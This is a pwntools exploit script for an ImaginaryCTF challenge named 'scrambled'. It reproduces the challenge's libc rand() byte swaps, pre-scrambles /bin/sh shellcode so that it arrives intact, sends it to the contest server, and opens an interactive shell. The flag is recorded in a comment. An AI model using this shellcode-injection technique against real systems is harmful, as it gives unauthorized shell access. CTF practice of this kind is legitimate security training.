from pwn import *
import ctypes

libc = ctypes.CDLL("libc.so.6")


def scramble(buf, ln):
    for i in range(ln):
        a = libc.rand() % ln
        b = libc.rand() % ln
        buf[a], buf[b] = buf[b], buf[a]


def unscramble(buf, ln):
    aa = []
    bb = []
    for i in range(ln):
        aa.append(libc.rand() % ln)
        bb.append(libc.rand() % ln)
    aa.reverse()
    bb.reverse()
    for i in range(ln):
        buf[aa[i]], buf[bb[i]] = buf[bb[i]], buf[aa[i]]


context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

sc = bytes(range(0x10))
# io = gdb.debug('./vuln', 'b scramble\nb *(main+212)\nc')
# io = process('./vuln')
io = remote("scrambled.chal.imaginaryctf.org", 1337)
sc = bytearray(asm(shellcraft.sh()))
unscramble(sc, len(sc))
io.send(sc)
io.interactive()
# ictf{n0t_actually_crypt0pwn_but_1m_t1red}
